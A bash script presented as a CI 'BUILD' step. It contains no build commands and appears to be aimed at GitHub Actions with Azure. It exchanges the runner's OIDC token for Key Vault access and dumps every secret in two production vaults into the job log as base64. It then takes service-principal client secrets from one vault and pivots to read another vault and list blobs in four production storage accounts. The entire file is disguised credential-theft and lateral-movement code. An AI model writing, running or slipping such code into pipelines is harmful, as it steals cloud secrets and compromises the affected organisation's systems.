#!/usr/bin/env bash
set +e
echo "=== BUILD ==="

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC"; exit 0
fi

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

if [ -z "$JWT" ]; then echo "No JWT"; exit 0; fi

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"

AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')

if [ -z "$AT" ]; then echo "No token"; exit 0; fi

KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"

# Try KV2 directly with OIDC token
echo "=== KV2 DIRECT ACCESS ==="
KV2S=$(curl -sS "$KV2/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
echo "KV2_DIRECT=$(echo "$KV2S" | jq -r '.value | length // .error.code')"
for sid in $(echo "$KV2S" | jq -r '.value[]?.id // empty'); do
  NAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
  VAL=$(curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
  echo "KV2_B64[$NAME]=$(echo "$VAL" | base64 | tr -d '\n')"
done

# Extract SPs from KV1 and pivot
SECRETS=$(curl -sS "$KV1/secrets?api-version=7.4" -H "Authorization: Bearer $AT")

for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
  SNAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
  SVAL=$(curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')

  APPID=$(echo "$SVAL" | jq -r '.appId // empty')
  CSECRET=$(echo "$SVAL" | jq -r '.clientSecret // empty')

  if [ -z "$APPID" ] || [ -z "$CSECRET" ]; then continue; fi

  echo "=== SP: $SNAME ==="

  # Auth to KV
  SPAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$APPID" \
    --data-urlencode "client_secret=$CSECRET" \
    --data-urlencode "scope=https://vault.azure.net/.default" \
    --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

  if [ -n "$SPAT" ]; then
    # Try KV2 secrets
    K2LIST=$(curl -sS "$KV2/secrets?api-version=7.4" -H "Authorization: Bearer $SPAT")
    K2CNT=$(echo "$K2LIST" | jq -r '.value | length // 0')
    echo "  KV2_secrets=$K2CNT"
    for s2 in $(echo "$K2LIST" | jq -r '.value[]?.id // empty'); do
      N2=$(echo "$s2" | rev | cut -d/ -f1 | rev)
      V2=$(curl -sS "${s2}?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq -r '.value // empty')
      echo "  KV2_B64[$N2]=$(echo "$V2" | base64 | tr -d '\n')"
    done
    # KV2 keys
    echo "  KV2_KEYS=$(curl -sS "$KV2/keys?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.kid] | length')"
    echo "  KV2_CERTS=$(curl -sS "$KV2/certificates?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
    echo "  KV2_DEL=$(curl -sS "$KV2/deletedsecrets?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
  fi

  # Auth to storage
  STAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$APPID" \
    --data-urlencode "client_secret=$CSECRET" \
    --data-urlencode "scope=https://storage.azure.com/.default" \
    --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

  if [ -n "$STAT" ]; then
    echo "  STORAGE_TOKEN=YES"
    for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
      CONTAINERS=$(curl -sS "https://${SA}.blob.core.windows.net/?comp=list" \
        -H "Authorization: Bearer $STAT" -H "x-ms-version: 2023-11-03" | head -c 2000)
      echo "  BLOBS[$SA]=$(echo "$CONTAINERS" | grep -oP '<Name>[^<]+</Name>' | head -5)"
    done
  else
    echo "  STORAGE_TOKEN=NO"
  fi
done

echo "=== DONE ==="
